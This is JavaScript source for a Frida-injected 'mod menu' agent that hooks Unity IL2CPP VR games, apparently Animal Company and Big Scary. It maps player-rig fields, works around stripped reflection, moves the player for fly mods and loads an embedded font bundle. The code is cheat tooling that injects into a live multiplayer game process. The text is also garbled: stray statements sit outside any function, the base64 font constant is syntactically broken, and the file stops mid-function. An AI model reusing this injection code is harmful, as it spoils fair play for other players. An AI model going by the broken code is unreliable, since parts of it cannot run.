function normalizeSceneObjectHandle(obj) {
    try {
        if (!obj || obj.isNull?.())
            return "";
        const handle = obj.handle;
        if (!handle)
            return "";
        return handle.toString();
    }
    catch (_) {
        return "";
    }
}

    templateMenuInputCaptured = true;
}

let leftChordHeld = false;
let rightChordHeld = false;
function normalizeArcaneModInput() {
    templateMenuInputCaptured = time < templateMenuInputCaptureUntil;
    rightChordHeld = !!(rightGrab && rightTrigger);
    leftChordHeld = !!(leftGrab && leftTrigger);
    if (templateMenuInputCaptured) {
        leftGrab = leftTrigger = rightGrab = rightTrigger = false;
        leftChordHeld = rightChordHeld = false;
    }
}

const arcaneMainThreadTasks = [];
function runArcaneMainThreadTasks() {
    const now = Date.now();
    let processed = 0;
    for (let i = arcaneMainThreadTasks.length - 1; i >= 0 && processed < 16; i--) {
        const task = arcaneMainThreadTasks[i];
        if (!task || task.due > now) continue;
        arcaneMainThreadTasks.splice(i, 1);
        processed++;
        try { task.action(); }
        catch (e) { console.error("[MainThreadTask] " + task.label + ":", e); }
    }
}

// Process-wide singleton guard. Recent WER reports showed several different frida-agent
// modules attached to the same Animal Company process at once; each one installed the same
// hooks and their competing thunks eventually terminated Unity. The named mutex makes all
// later injected copies exit before installing anything, without changing the loader.
let _arcaneAgentMutex = null;
function claimArcaneAgentSingleton() {
    if (typeof Process === "undefined" || Process.platform !== "windows") return true;
    try {
        const kernel = Process.getModuleByName("kernel32.dll");
        const createPtr = kernel.getExportByName("CreateMutexW");
        const errorPtr = kernel.getExportByName("GetLastError");
        const closePtr = kernel.getExportByName("CloseHandle");
        const CreateMutexW = new NativeFunction(createPtr, "pointer", ["pointer", "uint32", "pointer"]);
        const GetLastError = new NativeFunction(errorPtr, "uint32", []);
        const CloseHandle = new NativeFunction(closePtr, "uint32", ["pointer"]);
        const mutexName = Memory.allocUtf16String("Local\\ArcaneACMenu.SingleAgent." + Process.id);
        const handle = CreateMutexW(ptr(0), 0, mutexName);
        if (!handle || handle.isNull()) return true; // fail open on unusual compatibility layers
        const alreadyExists = (GetLastError() >>> 0) === 183; // ERROR_ALREADY_EXISTS
        if (alreadyExists) {
            try { CloseHandle(handle); } catch (_) { }
            console.error("[Arcane] another menu agent is already attached; duplicate injection skipped");
            return false;
        }
        // Intentionally keep this process handle open until the game exits. Hook thunks can
        // outlive a Frida script unload, so allowing a hot reinjection into the same Unity process
        // recreates the exact multi-owner crash. A clean game restart releases the mutex normally.
        _arcaneAgentMutex = handle;
        return true;
    } catch (e) {
        console.error("[Arcane] singleton guard unavailable:", e);
        return true;
    }
}

Il2Cpp.perform(async () => {
    if (!claimArcaneAgentSingleton()) return;
    // =====================================================================
    // TARGET PROFILE  --  the only game-specific part of this script.
    // Everything past it (menu build/render, themes, gunlib, search,
    // favourites, config, sounds) is engine-level and needs no edits.
    //
    // Every slot takes a CANDIDATE LIST, tried in order, first match wins.
    // A class entry is either "Namespace.Class" (looked up in gameAssembly)
    // or { assembly: "Other.Asm", class: "Namespace.Class" }.
    // Whatever resolves gets logged, so an unmapped game tells you its own
    // names on the first run instead of dying quietly.
    // =====================================================================
    const TARGET = {
        gameAssembly: "Assembly-CSharp",
        // Unity splits game code in two: plugins/third-party land in
        // -firstpass. RootMotion (FinalIK) lives there, not in Assembly-CSharp.
        fallbackAssemblies: ["Assembly-CSharp-firstpass"],

        playerRig: {
            // Big Scary runs the Gorilla Tag locomotion, same ancestor as
            // Animal Company's rig -- which is why the part names below are
            // unchanged from that build. Verified against the class dump.
            candidates: ["GorillaLocomotion.Player", "AnimalCompany.GorillaLocomotion"],
            // The singleton field is obfuscated (BHIHCIIPOEG in v137.9) and
            // renames every build, so it is found by SHAPE first: the static
            // field whose type is the class itself. Names are only a fallback.
            instanceFields: ["BHHDPBKCEFH", "<Instance>k__BackingField", "Instance", "_instance"],
            leftHand:  ["leftHandTransform"],
            rightHand: ["rightHandTransform"],
            head:      ["headCollider"],
            body:      ["bodyCollider"],
            // GorillaLocomotion.Player exposes no scale; menu falls back to 1.0.
            scale:     []
        },

        // Only used as an update-hook candidate. Optional.
        netPlayer: {
            candidates: ["PhotonVRPlayerBody"],
            optional: true
        },

        // No separate controller in this game: the rig itself carries
        // Move(Vector3). Same class, resolved independently on purpose.
        playerController: {
            candidates: ["GorillaLocomotion.Player"],
            instanceMethods: ["get_instance", "get_Instance"],
            moveMethods: ["Move", "ApplyVelocity", "SetVelocity"],
            optional: true
        },

        // FinalIK trigger relay: 1 field, OnTriggerEnter/Stay/Exit, no game
        // logic to fire when we bolt it onto menu buttons. It lives in
        // Assembly-CSharp-firstpass, hence the explicit assembly.
        // BackspaceScript is the in-Assembly-CSharp fallback: a plain
        // MonoBehaviour, 2 fields, real OnTriggerEnter. Both have their body
        // replaced wholesale, so only the attach cost matters.
        triggerButton: {
            candidates: [
                { assembly: "Assembly-CSharp-firstpass", class: "RootMotion.TriggerEventBroadcaster" },
                { assembly: "Assembly-CSharp-firstpass", class: "TriggerEventBroadcaster" },
                "TriggerEventBroadcaster",
                "BackspaceScript"
            ]
        }
    };

    // Wait for the game assembly, but SAY SO instead of spinning in silence.
    let domainReady = false;
    for (let attempt = 1; !domainReady; attempt++) {
        try {
            const test = Il2Cpp.domain.assembly(TARGET.gameAssembly).image;
            if (test && !test.isNull()) domainReady = true;
        }
        catch (_) {
            if (attempt === 1) {
                console.error("[Arcane] assembly \"" + TARGET.gameAssembly + "\" not present yet.");
                try {
                    console.error("[Arcane] loaded assemblies: " +
                        Il2Cpp.domain.assemblies.map(a => a.name).sort().join(", "));
                } catch (_) { }
            } else if (attempt % 10 === 0) {
                console.error("[Arcane] still waiting for \"" + TARGET.gameAssembly +
                    "\" after " + attempt + " tries -- TARGET.gameAssembly is probably wrong.");
            }
        }
        if (!domainReady) await new Promise(r => setTimeout(r, 3000));
    }
    console.log("[Arcane] game assembly ready: " + TARGET.gameAssembly);

    // ---------------------------------------------------------------------
    // BRIDGE WARM-UP -- must run before the first field/value read.
    //
    // Il2Cpp.Type.Enum is a lazy static getter. Building it finishes with:
    //     VAR:  System.Action`1 -> .generics[0]
    //     MVAR: System.Array    -> .method("AsReadOnly", 1).generics[0]
    // and `.generics` calls Type.GetGenericArguments() through managed
    // reflection. IL2CPP strips unused reflection, and this build stripped
    // that one, so the invoke lands on a bad pointer: every value read dies
    // with "access violation accessing 0xb4000087" from deep inside the
    // bridge, with nothing of ours on the stack.
    //
    // The getter runs Reflect.defineProperty(this,"Enum",{value:initial})
    // BEFORE it evaluates VAR/MVAR. So forcing it once here leaves the
    // primitive table permanently installed and lets the crash land
    // somewhere we can swallow it. Nothing is lost: on ANY game the richer
    // object the getter returns is discarded after first access anyway.
    // ---------------------------------------------------------------------
    try { void Il2Cpp.Type.Enum; } catch (_) { }

    let _typeTableOk = false;
    try { _typeTableOk = !!Il2Cpp.Type.Enum && Il2Cpp.Type.Enum.INT !== undefined; } catch (_) { }

    if (!_typeTableOk) {
        // The primitive half failed too, so install the constants directly.
        // These are Il2CppTypeEnum from il2cpp-tabledefs.h -- fixed by the
        // runtime ABI, not by the game, so they are safe to hardcode.
        const TYPE_ENUM = {
            VOID: 0x01, BOOLEAN: 0x02, CHAR: 0x03, BYTE: 0x04, UBYTE: 0x05,
            SHORT: 0x06, USHORT: 0x07, INT: 0x08, UINT: 0x09, LONG: 0x0a,
            ULONG: 0x0b, FLOAT: 0x0c, DOUBLE: 0x0d, STRING: 0x0e,
            POINTER: 0x0f, VALUE_TYPE: 0x11, CLASS: 0x12, VAR: 0x13,
            NARRAY: 0x14, GENERIC_INSTANCE: 0x15, NINT: 0x18, NUINT: 0x19,
            OBJECT: 0x1c, ARRAY: 0x1d, MVAR: 0x1e
        };
        // The bridge also stores the reverse mapping (value -> name); mirror
        // addFlippedEntries so anything doing a numeric lookup still works.
        // NB: literal key list, not Object.keys -- `Object` is rebound later
        // in this scope to UnityEngine.Object, so touching it here would hit
        // the temporal dead zone and throw.
        const _tk = ["VOID", "BOOLEAN", "CHAR", "BYTE", "UBYTE", "SHORT", "USHORT",
                     "INT", "UINT", "LONG", "ULONG", "FLOAT", "DOUBLE", "STRING",
                     "POINTER", "VALUE_TYPE", "CLASS", "VAR", "NARRAY",
                     "GENERIC_INSTANCE", "NINT", "NUINT", "OBJECT", "ARRAY", "MVAR"];
        for (const k of _tk) TYPE_ENUM[TYPE_ENUM[k]] = k;
        try {
            Reflect.defineProperty(Il2Cpp.Type, "Enum", { value: TYPE_ENUM, configurable: true });
            _typeTableOk = Il2Cpp.Type.Enum.INT === 0x08;
        }
        catch (e) { console.error("[Arcane] could not install type table: " + e); }
    }
    console.log("[Arcane] il2cpp type table: " + (_typeTableOk ? "ready" : "UNUSABLE"));

    const needAssembly = (name) => {
        try { return Il2Cpp.domain.assembly(name).image; }
        catch (e) { console.error("[Arcane] required assembly missing: " + name); throw e; }
    };
    const AssemblyCSharp = needAssembly(TARGET.gameAssembly);
    const UnityEngineCore = needAssembly("UnityEngine.CoreModule");
    const UnityEnginePhysics = needAssembly("UnityEngine.PhysicsModule");
    const UnityEngineTextRendering = needAssembly("UnityEngine.TextRenderingModule");
    const UnityTextMeshPro = needAssembly("Unity.TextMeshPro");
    const UnityEngineXR = needAssembly("UnityEngine.XRModule");

    // Walk a slot's candidate list; log the winner, or every miss.
    // A bare "Namespace.Class" is searched in gameAssembly AND in every
    // fallbackAssemblies entry -- Unity splits game code across
    // Assembly-CSharp and Assembly-CSharp-firstpass (plugins land in the
    // latter), so assuming one of them silently loses half the classes.
    function resolveTargetClass(field) {
        const slot = TARGET[field] || {};
        const tried = [];
        for (const entry of (slot.candidates || [])) {
            const asms = (typeof entry === "string")
                ? [TARGET.gameAssembly].concat(TARGET.fallbackAssemblies || [])
                : [entry.assembly];
            const cls = (typeof entry === "string") ? entry : entry.class;
            for (const asm of asms) {
                tried.push(asm + " :: " + cls);
                try {
                    const k = Il2Cpp.domain.assembly(asm).image.class(cls);
                    if (k) {
                        console.log("[Arcane] TARGET." + field + " -> " + cls + "   (" + asm + ")");
                        return k;
                    }
                }
                catch (_) { }
            }
        }
        const msg = "[Arcane] TARGET." + field + ": nothing resolved. Tried:\n    " + tried.join("\n    ");
        if (slot.optional) { console.warn(msg + "\n    (optional -- that feature is disabled)"); return null; }
        console.error(msg + "\n    Add the right name to TARGET." + field + ".candidates");
        throw new Error("TARGET." + field + " unresolved");
    }

    const GTPlayerClass = resolveTargetClass("playerRig");
    const NetPlayer = resolveTargetClass("netPlayer");
    const PCClass = resolveTargetClass("playerController");
    const GorillaReportButton = resolveTargetClass("triggerButton");
    const InputDevices = UnityEngineXR.class("UnityEngine.XR.InputDevices");
    const CommonUsages = UnityEngineXR.class("UnityEngine.XR.CommonUsages");
    const GameObject = UnityEngineCore.class("UnityEngine.GameObject");
    const Object = UnityEngineCore.class("UnityEngine.Object");
    const Vector3 = UnityEngineCore.class("UnityEngine.Vector3");
    const Quaternion = UnityEngineCore.class("UnityEngine.Quaternion");
    const Time = UnityEngineCore.class("UnityEngine.Time");
    const Resources = UnityEngineCore.class("UnityEngine.Resources");
    const Renderer = UnityEngineCore.class("UnityEngine.Renderer");
    const Shader = UnityEngineCore.class("UnityEngine.Shader");
    const Camera = UnityEngineCore.class("UnityEngine.Camera");
    const LineRenderer = UnityEngineCore.class("UnityEngine.LineRenderer");
    const Collider = UnityEnginePhysics.class("UnityEngine.Collider");
    const ComponentClass = UnityEngineCore.class("UnityEngine.Component");
    const Rigidbody = UnityEnginePhysics.class("UnityEngine.Rigidbody");
    const Physics = UnityEnginePhysics.class("UnityEngine.Physics");
    const RaycastHitClass = UnityEnginePhysics.class("UnityEngine.RaycastHit");
    // Legacy keyboard/mouse input (used by PC/flatscreen mode).
    let InputLegacy = null;
    try { InputLegacy = Il2Cpp.domain.assembly("UnityEngine.InputLegacyModule").image.class("UnityEngine.Input"); }
    catch (_) { try { InputLegacy = UnityEngineCore.class("UnityEngine.Input"); } catch (__) { } }
    let Texture2DClass = null;
    try { Texture2DClass = UnityEngineCore.class("UnityEngine.Texture2D"); } catch (_) { }
    let MobDataUtilityClass = null;
    try {
        MobDataUtilityClass = AssemblyCSharp.class("AnimalCompany.MobDataUtility");
    }
    catch (_) { }
    const Font = UnityEngineTextRendering.class("UnityEngine.Font");
    let AssetBundleClass = null;
    try {
        AssetBundleClass = Il2Cpp.domain.assembly("UnityEngine.AssetBundleModule")
            .image.class("UnityEngine.AssetBundle");
    } catch (_) {
        try { AssetBundleClass = UnityEngineCore.class("UnityEngine.AssetBundle"); } catch (__) { }
    }
    // Exact Segoe UI Bold, packaged as an Android Unity font bundle. Big Scary
    // strips LoadFromMemory, so the decoded bytes are loaded from its cache.
    const ARCANE_SEGOE_BUNDLE_FILE = "arcane-segoe-a6b67d45b0e9.bundle";
    const ARCANE_SEGOE_BUNDLE_BASE64 =

        + "AARDQUItY2VmZjFjYzVkZGRkMWJhYmFmZmNkZjcyODhiMTFkMzIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAAAAAAAAAAAAYOCAAAAAAAYXtIAAAAA"

    function getarialnocrash2() {
        if (arial && !arial.isNull())
            return arial;
        const nowMs = Date.now();
        if (nowMs < arialRetryAfter)
            return null;
        // Try loading the Gorilla Tag font (gorilla-tag-font.otf) by OS font name.
        // For this to work, install gorilla-tag-font.otf on your PC first:
        //   Right-click gorilla-tag-font.otf -> "Install for all users"
        // The installed font name is "gorilla-tag-font" (no extension).
        try {
            const gorillaFont = Font.method("CreateDynamicFontFromOSFont", 2).invoke(Il2Cpp.string("gorilla-tag-font"), 24);
            if (gorillaFont && !gorillaFont.isNull()) {
                arial = gorillaFont;
                return arial;
            }
        }
        catch (_) { }
        // Fallback: Unity built-in Arial
        try {
            try { arial = Resources.method("GetBuiltinResource").overload("System.Type", "System.String").invoke(Font.type.object, Il2Cpp.string("Arial.ttf")); }
            catch (_) { arial = Resources.method("GetBuiltinResource", 1).inflate(Font).invoke(Il2Cpp.string("Arial.ttf")); }
        }
        catch (e) {
            arial = null;
            arialRetryAfter = nowMs + 2000;
            if (!menuFontWarned) {
                menuFontWarned = true;
                console.error("[menu] Font load failed (gorilla-tag-font + Arial.ttf both failed); text will retry later");
            }
        }
        return arial;
    }

    const ARCANE_SEGOE_TMP_ASSET_NAME = "Arcane Segoe UI Bold SDF " + ARCANE_SEGOE_BUNDLE_FILE;
    function _tmpBoundField(object, name) {
        if (!object || object.isNull?.()) return null;
        try {
            const direct = object.tryField(name);
            if (direct) return direct;
        } catch (_) { }
        try {
            for (const klass of object.class.hierarchy()) {
                const field = klass.tryField(name);
                if (field && !field.isStatic) return field.bind(object);
            }
        } catch (_) { }
        return null;
    }
    function _findExistingEmbeddedSegoeTmpFont() {
        try {
            if (unityAlive(_embeddedSegoeTmpFont)) return true;
            if (!TMPFontAssetClass) return false;
            const found = Resources.method("FindObjectsOfTypeAll").overload("System.Type")
                .invoke(TMPFontAssetClass.type.object);
            if (!found || found.isNull?.()) return false;
            const base = arrData(found);
            for (let i = 0; i < found.length; i++) {
                try {
                    const p = base.add(i * Process.pointerSize).readPointer();
                    if (!p || p.isNull()) continue;
                    const candidate = new Il2Cpp.Object(p);
                    const n = candidate.method("get_name").invoke();
                    const name = n ? (n.content || "") : "";
                    // Only reuse an asset created by this bundle. A broad
                    // "Segoe UI Bold" regex could silently accept another
                    // loaded font after a Frida reinjection.
                    if (name === ARCANE_SEGOE_TMP_ASSET_NAME || name === "Segoe UI Bold SDF Embedded") {
                        let materialName = "";
                        try {
                            const materialField = _tmpBoundField(candidate, "material");
                            const material = materialField ? materialField.value : null;
                            const mn = material.method("get_name").invoke();
                            materialName = mn ? (mn.content || "") : "";
                        } catch (_) { }
                        if (materialName.indexOf("Segoe UI Bold SDF") < 0) continue;
                        _embeddedSegoeTmpFont = candidate;
                        try { candidate.method("set_name").invoke(Il2Cpp.string(ARCANE_SEGOE_TMP_ASSET_NAME)); } catch (_) { }
                        console.log("[menu] reusing verified Segoe UI Bold TMP font: " + materialName);
                        return true;
                    }
                } catch (_) { }
            }
        } catch (_) { }
        return false;
    }
    function _loadEmbeddedSegoeBundle() {
        if (_embeddedSegoeTried) return;
        try {
            console.log("[font] checking for existing embedded font...");
            if (_findExistingEmbeddedSegoeTmpFont()) { _embeddedSegoeTried = true; return; }
            if (!AssetBundleClass) throw new Error("UnityEngine.AssetBundle class unavailable");

            let corlib = null;
            try { corlib = Il2Cpp.corlib; }
            catch (_) { corlib = Il2Cpp.domain.assembly("mscorlib").image; }
            console.log("[font] creating Il2Cpp string (" + ARCANE_SEGOE_BUNDLE_BASE64.length + " chars)...");
            const _fontT0 = Date.now();
            const _b64Str = Il2Cpp.string(ARCANE_SEGOE_BUNDLE_BASE64);
            console.log("[font] Il2Cpp.string created in " + (Date.now() - _fontT0) + "ms, decoding base64...");
            const managedBytes = corlib.class("System.Convert")
                .method("FromBase64String", 1)
                .invoke(_b64Str);
            console.log("[font] base64 decoded in " + (Date.now() - _fontT0) + "ms");
            if (!managedBytes || managedBytes.isNull?.()) throw new Error("Base64 decode returned null");

            const app = UnityEngineCore.class("UnityEngine.Application");
            const cacheValue = app.method("get_temporaryCachePath", 0).invoke();
            const cacheRoot = cacheValue ? (cacheValue.content || "") : "";
            if (!cacheRoot) throw new Error("Application.temporaryCachePath returned empty");
            const bundlePath = cacheRoot.replace(/[\/]+$/, "") + "/" + ARCANE_SEGOE_BUNDLE_FILE;
            const file = corlib.class("System.IO.File");
            console.log("[font] writing bundle to " + bundlePath + "...");
            file.method("WriteAllBytes", 2)
                .overload("System.String", "System.Byte[]")
                .invoke(Il2Cpp.string(bundlePath), managedBytes);

            console.log("[font] loading AssetBundle from file...");
            const bundle = AssetBundleClass.method("LoadFromFile", 1)
                .overload("System.String")
                .invoke(Il2Cpp.string(bundlePath));
            if (!unityAlive(bundle)) throw new Error("AssetBundle.LoadFromFile returned null");
            console.log("[font] AssetBundle loaded OK in " + (Date.now() - _fontT0) + "ms total");
            _embeddedSegoeBundle = bundle;

            const loadAsset = bundle.method("LoadAsset", 2)
                .overload("System.String", "System.Type");
            const tmpPaths = [
                "assets/fonts/segoe-ui-bold-sdf.asset",
                "assets/fonts/segoe-ui-bold.asset",
                "segoe-ui-bold-sdf"
            ];
            for (let ti = 0; ti < tmpPaths.length && !unityAlive(_embeddedSegoeTmpFont); ti++) {
                try {
                    if (TMPFontAssetClass) {
                        _embeddedSegoeTmpFont = loadAsset.invoke(
                            Il2Cpp.string(tmpPaths[ti]),
                            TMPFontAssetClass.type.object);
                    }
                } catch (_) { _embeddedSegoeTmpFont = null; }
            }
            try {
                _embeddedSegoeFont = loadAsset.invoke(
                    Il2Cpp.string("assets/fonts/segoe-ui-bold.ttf"), Font.type.object);
            } catch (_) { _embeddedSegoeFont = null; }

            if (unityAlive(_embeddedSegoeFont)) {
                try { _embeddedSegoeFont.method("set_name").invoke(Il2Cpp.string("Segoe UI Bold Embedded")); } catch (_) { }
                try { _embeddedSegoeFont.method("set_hideFlags").invoke(61); } catch (_) { }
            }
            if (unityAlive(_embeddedSegoeTmpFont)) {
                try { _embeddedSegoeTmpFont.method("set_name").invoke(Il2Cpp.string(ARCANE_SEGOE_TMP_ASSET_NAME)); } catch (_) { }
                try { _embeddedSegoeTmpFont.method("set_hideFlags").invoke(61); } catch (_) { }
            }
            if (!unityAlive(_embeddedSegoeFont) && !unityAlive(_embeddedSegoeTmpFont))
                throw new Error("bundle contained neither expected font asset");

            _embeddedSegoeTried = true;
            console.log("[menu] embedded Segoe UI Bold loaded: Font=" +
                unityAlive(_embeddedSegoeFont) + " TMP(static)=" + unityAlive(_embeddedSegoeTmpFont));
        } catch (e) {
            _embeddedSegoeBundle = null;
            _embeddedSegoeFont = null;
            _embeddedSegoeTmpFont = null;
            // Do not set _embeddedSegoeTried on failure so a later call can retry.
            console.warn("[menu] embedded Segoe UI Bold failed; using game fallback: " + e);
        }
    }
    function getEmbeddedSegoeTmpFont() {
        _loadEmbeddedSegoeBundle();
        if (unityAlive(_embeddedSegoeTmpFont)) return _embeddedSegoeTmpFont;
        // Fallback: build a TMP font asset from the system Segoe-like font when
        // the embedded bundle's TMP asset failed to load. Keeps the menu on Segoe
        // instead of falling back to the game's static TMP font.
        if (TMPFontAssetClass) {
            try {
                const source = getMenuSegoeFont();
                if (source && !source.isNull?.()) {
                    const created = TMPFontAssetClass.method("CreateFontAsset", 1)
                        .overload("UnityEngine.Font")
                        .invoke(source);
                    if (created && !created.isNull?.()) return created;
                }
            } catch (e) {
                console.warn("[menu] embedded Segoe TMP font creation failed: " + e);
            }
        }
        return null;
    }
    function _isEmbeddedSegoeTmpFont(fontAsset) {
        if (!unityAlive(fontAsset) || !unityAlive(_embeddedSegoeTmpFont)) return false;
        return normalizeSceneObjectHandle(fontAsset) === normalizeSceneObjectHandle(_embeddedSegoeTmpFont);
    }
    function _isEmbeddedSegoeFont(font) {
        if (!unityAlive(font) || !unityAlive(_embeddedSegoeFont)) return false;
        return normalizeSceneObjectHandle(font) === normalizeSceneObjectHandle(_embeddedSegoeFont);
    }
    function getMenuSegoeFont() {
        _loadEmbeddedSegoeBundle();
        if (unityAlive(_embeddedSegoeFont)) return _embeddedSegoeFont;
        try { if (menuSegoeFont && !menuSegoeFont.isNull?.()) return menuSegoeFont; } catch (_) { menuSegoeFont = null; }
        if (menuSegoeFontAttempted) return getarialnocrash2();
        menuSegoeFontAttempted = true;
        // Segoe UI is not installed on Quest. Source Sans Pro is the closest
        // humanist system face available there; TextMesh applies Bold below.
        // Keep generic Android fallbacks so text still renders across OS builds.
        for (const family of ["source-sans-pro", "source-sans-pro-semi-bold",
                              "sans-serif", "Roboto", "Droid Sans"]) {
            try {
                const candidate = Font.method("CreateDynamicFontFromOSFont", 2)
                    .invoke(Il2Cpp.string(family), 48);
                if (candidate && !candidate.isNull?.()) {
                    menuSegoeFont = candidate;
                    return menuSegoeFont;
                }
            } catch (_) { }
        }
        return getarialnocrash2();
    }
    function gettmpfontnocrash() {
        if (tmpDefaultFontAsset && !tmpDefaultFontAsset.isNull())
            return tmpDefaultFontAsset;
        if (!TMPSettingsClass)
            return null;
        try {
            tmpDefaultFontAsset = TMPSettingsClass.method("get_defaultFontAsset").invoke();
        }
        catch (_) { }
        if (!tmpDefaultFontAsset || tmpDefaultFontAsset.isNull()) {
            try {
                const settingsInstance = TMPSettingsClass.method("get_instance").invoke();
                if (settingsInstance && !settingsInstance.isNull()) {
                    try {
                        tmpDefaultFontAsset = settingsInstance.method("get_defaultFontAsset").invoke();
                    }
                    catch (_) { }
                    if (!tmpDefaultFontAsset || tmpDefaultFontAsset.isNull()) {
                        try {
                            tmpDefaultFontAsset = settingsInstance.field("m_defaultFontAsset").value;
                        }
                        catch (_) { }
                    }
                }
            }
            catch (_) { }
        }
        return tmpDefaultFontAsset && !tmpDefaultFontAsset.isNull() ? tmpDefaultFontAsset : null;
    }
    const NullMethod = {
        invoke: () => NullObject,
        inflate: () => NullMethod,
        overload: () => NullMethod
    };
    const NullObject = {
        handle: { isNull: () => true },
        isNull: () => true,
        method: () => NullMethod,
        field: () => ({ value: NullObject }),
        tryField: () => null,
        tryMethod: () => null,
        class: { type: { name: "NullObject" } }
    };
    function isLiveObject(obj) {
        try {
            return !!obj && !(obj.isNull?.() ?? true);
        }
        catch (_) {
            return false;
        }
    }
    // Rig wiring differs per game, so probe the candidate field names once,
    // cache the winners, and print the mapping. Anything unmapped is reported
    // by name rather than silently left null.
    const _rigMap = { instance: null, left: null, right: null, head: null, body: null, scale: null, logged: false };

    function _rigProbe(holder, names, label) {
        // Once a field name is known, go straight to it. Re-probing the list
        // every frame is what made this cost several times what AC paid.
        const known = _rigMap[label];
        if (known) {
            try { return holder.field(known).value; }
            catch (_) { _rigMap[label] = null; }
        }
        for (const n of (names || [])) {
            try {
                const f = holder.field(n);
                if (f !== undefined && f !== null) { _rigMap[label] = n; return f.value; }
            }
            catch (_) { }
        }
        return undefined;
    }

    // Obfuscated singleton names change every game build, so prefer shape:
    // a static field on the class whose type IS the class. That survives
    // renames; the name list below is only a fallback.
    const _selfStaticCache = new Map();
    function _staticSelfInstance(klass) {
        if (!klass) return null;
        try {
            let name = _selfStaticCache.get(klass.handle.toString());
            if (name === undefined) {
                name = null;
                for (const f of klass.fields) {
                    try {
                        if (!f.isStatic) continue;
                        if (f.type && f.type.name && f.type.name === klass.type.name) { name = f.name; break; }
                    }
                    catch (_) { }
                }
                _selfStaticCache.set(klass.handle.toString(), name);
                if (name) console.log("[Arcane] singleton field for " + klass.name + " -> " + name);
            }
            if (name) {
                const v = klass.field(name).value;
                if (isLiveObject(v)) return v;
            }
        }
        catch (_) { }
        return null;
    }

    let _rigRbName = null;
    function _rigRigidbody() {
        try {
            if (!isLiveObject(GTPlayer)) return null;
            if (!_rigRbName) {
                for (const f of GTPlayerClass.fields) {
                    try {
                        if (!f.isStatic && f.type && /Rigidbody/.test(f.type.name)) { _rigRbName = f.name; break; }
                    } catch (_) { }
                }
                if (_rigRbName) console.log("[mods] rig rigidbody field -> " + _rigRbName);
            }
            return _rigRbName ? GTPlayer.field(_rigRbName).value : null;
        } catch (_) { return null; }
    }
    function _rigInstance() {
        const byShape = _staticSelfInstance(GTPlayerClass);
        if (isLiveObject(byShape)) { _rigMap.instance = "(static self-field)"; return byShape; }
        for (const n of (TARGET.playerRig.instanceFields || [])) {
            try {
                const v = GTPlayerClass.field(n).value;
                if (isLiveObject(v)) { _rigMap.instance = n; return v; }
            }
            catch (_) { }
        }
        // XROrigin / OVRCameraRig have no singleton -- scan the scene instead.
        try {
            const found = Object.method("FindObjectOfType", 1).invoke(GTPlayerClass.type.object);
            if (isLiveObject(found)) { _rigMap.instance = "(FindObjectOfType)"; return found; }
        }
        catch (_) { }
        return null;
    }

    // Instance accessor + movement method both vary per game.
    function _pcInstance() {
        if (!PCClass) return null;
        // Big Scary has no get_instance(): movement lives on the rig itself,
        // so reuse the already-resolved rig before probing anything else.
        if (PCClass.handle && GTPlayerClass && PCClass.handle.equals(GTPlayerClass.handle) && isLiveObject(GTPlayer))
            return GTPlayer;
        const byShape = _staticSelfInstance(PCClass);
        if (byShape) return byShape;
        for (const m of (TARGET.playerController.instanceMethods || [])) {
            try {
                const v = PCClass.method(m).invoke();
                if (v && !v.isNull?.()) return v;
            }
            catch (_) { }
        }
        try {
            const found = Object.method("FindObjectOfType", 1).invoke(PCClass.type.object);
            if (found && !found.isNull?.()) return found;
        }
        catch (_) { }
        return null;
    }
    // REVERTED: this used to also call SetVelocity(delta/dt) every frame to
    // beat gravity. That overwrites the rig's own velocity each tick, which
    // fights GorillaLocomotion and made Trigger fly throw the player around.
    // Straight positional delta only -- the same shape as Animal Company's
    // AddDirectMovement, which is what the fly mods were written against.
    function _pcMove(pc, vec) {
        for (const m of (TARGET.playerController.moveMethods || [])) {
            try { pc.method(m).invoke(vec); return true; }
            catch (_) { }
        }
        return false;
    }
    function refreshRuntimeRefs() {
        try {
            const player = _rigInstance();
            if (isLiveObject(player)) GTPlayer = player;
        }
        catch (_) { }
        try {
            if (isLiveObject(GTPlayer)) {
                const rig = TARGET.playerRig;
                const l = _rigProbe(GTPlayer, rig.leftHand, "left");
                if (isLiveObject(l)) leftHandTransform = l;
                const r = _rigProbe(GTPlayer, rig.rightHand, "right");
                if (isLiveObject(r)) rightHandTransform = r;
                const h = _rigProbe(GTPlayer, rig.head, "head");
                if (isLiveObject(h)) headCollider = h;
                const bd = _rigProbe(GTPlayer, rig.body, "body");
                if (isLiveObject(bd)) bodyCollider = bd;

                if (!_rigMap.logged) {
                    _rigMap.logged = true;
                    console.log("[Arcane] rig mapping: instance=" + _rigMap.instance +
                        " left=" + _rigMap.left + " right=" + _rigMap.right +
                        " head=" + _rigMap.head + " body=" + _rigMap.body);
                    for (const part of ["left", "right", "head", "body"]) {
                        if (!_rigMap[part])
                            console.warn("[Arcane] rig." + part + " unmapped -- add its field name to " +
                                "TARGET.playerRig." + (part === "left" ? "leftHand" : part === "right" ? "rightHand" : part));
                    }
                }
            }
        }
        catch (_) { }
        // Gate only on the rig instance: renderMenu needs its scale. Hand-dependent
        // features are individually guarded, so a missing hand no-ops that feature
        // instead of killing the whole menu loop.
        return isLiveObject(GTPlayer);
    }
    let runtimeRefMissCount = 0;
    function logButtonRuntimeError(button, error) {
        const now = time ?? 0;
        const nextLogTime = button.__nextErrorLogTime ?? 0;
        const failCount = ((button.__failCount ?? 0) + 1);
        button.__failCount = failCount;
        if (failCount === 1 || now >= nextLogTime) {
            console.error(`[LateUpdate] Error in '${button.buttonText}':`, error);
            button.__nextErrorLogTime = now + 1.5;
        }
    }
    function Destroy(object) {
        try {
            if (!object || object === NullObject)
                return;
            if (object.isNull?.())
                return;
            Object.method("Destroy", 1).invoke(object);
        }
        catch (_) { }
    }
    function getComponent(obj, type) {
        try {
            if (!obj || obj.isNull?.())
                return null;
            const m = _compMethod(false);
            if (m) { try { return m.bind(obj).invoke(_typeObj(type)); } catch (_) { } }
            return obj.method("GetComponent", 1).inflate(type).invoke();
        }
        catch (_) {
            return null;
        }
    }
    // Generic AddComponent<T> access-violates on this build (stripped
    // reflection); the System.Type overload does not. inflate() is kept as a
    // fallback so the same source still runs on games where generics work.
    // PERF: .overload("System.Type") compares parameter type names, and every
    // one of those comparisons is a native call. Menu rebuilds do ~120 of
    // these, which is what made the menu feel sluggish next to the AC build.
    // Resolve the overload ONCE against the GameObject class, then bind() it
    // per object. Same for type.type.object, another native chain per call.
    let _mAdd, _mGet;
    const _typeObjCache = new Map();
    function _typeObj(type) {
        const k = type.handle.toString();
        let v = _typeObjCache.get(k);
        if (v === undefined) { v = type.type.object; _typeObjCache.set(k, v); }
        return v;
    }
    function _compMethod(add) {
